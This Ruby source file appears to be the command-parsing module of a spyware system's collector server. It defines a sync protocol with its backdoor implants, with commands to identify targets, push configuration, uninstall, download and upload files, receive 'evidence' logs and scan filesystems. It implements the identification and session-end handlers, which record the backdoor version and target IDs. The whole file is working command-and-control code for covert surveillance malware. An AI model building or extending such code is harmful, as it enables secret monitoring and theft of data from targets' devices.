#
#  Command parsing or the protocol (to be mixed-in in protocol)
#

# relatives
require_relative 'sessions.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/pascalize'

# system

module RCS
module Collector

module Commands

  # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest

  INVALID_COMMAND  = 0x00       # Don't use
  PROTO_OK         = 0x01       # OK
  PROTO_NO         = 0x02       # Nothing available
  PROTO_BYE        = 0x03       # The end of the protocol
  PROTO_CHALLENGE  = 0x04       # Authentication
  PROTO_ID         = 0x0f       # Identification of the target
  PROTO_CONF       = 0x07       # New configuration
  PROTO_UNINSTALL  = 0x0a       # Uninstall command
  PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
  PROTO_UPLOAD     = 0x0d       # A file to be saved
  PROTO_EVIDENCE   = 0x09       # Upload of a log
  PROTO_FILESYSTEM = 0x19       # List of paths to be scanned

  LOOKUP = { PROTO_ID => :command_id,
             PROTO_BYE => :command_bye}

  # Protocol Identification
  # -> PROTO_ID  [Version, UserId, DeviceId, SourceId]
  # <- PROTO_OK, Time, Availables
  def command_id(peer, session, message)

    # backdoor version
    version = message.slice!(0..3).unpack('i').first

    # ident of the target
    user_id, device_id, source_id = message.unpascalize_ary

    trace :info, "[#{peer}][#{session[:cookie]}] Identification: #{version} '#{user_id}' '#{device_id}' '#{source_id}'"

    # notify the database that the sync is in progress
    DB.instance.sync_for session[:bid], version, user_id, device_id, source_id, Time.now

    #TODO pusher create dir
    
    command = [PROTO_OK].pack('i')

    # the time of the server to synchronize the clocks
    time = [Time.new.to_i].pack('q')

    available = ""
    #TODO: ask to the db
    #available = [PROTO_CONF].pack('i')

    # calculate the total size of the response
    tot = time.length + 4 + available.length

    # prepare the response
    response = command + [tot].pack('i') + time + [available.length].pack('i') + available

    return response
  end

  # Protocol End
  # -> PROTO_BYE
  # <- PROTO_OK
  def command_bye(peer, session, message)
    trace :info, "[#{peer}][#{session[:cookie]}] Synchronization completed"

    # destroy the current session
    SessionManager.instance.delete(session[:cookie])
    
    return [PROTO_OK].pack('i')
  end

end #Commands

end #Collector::
end #RCS::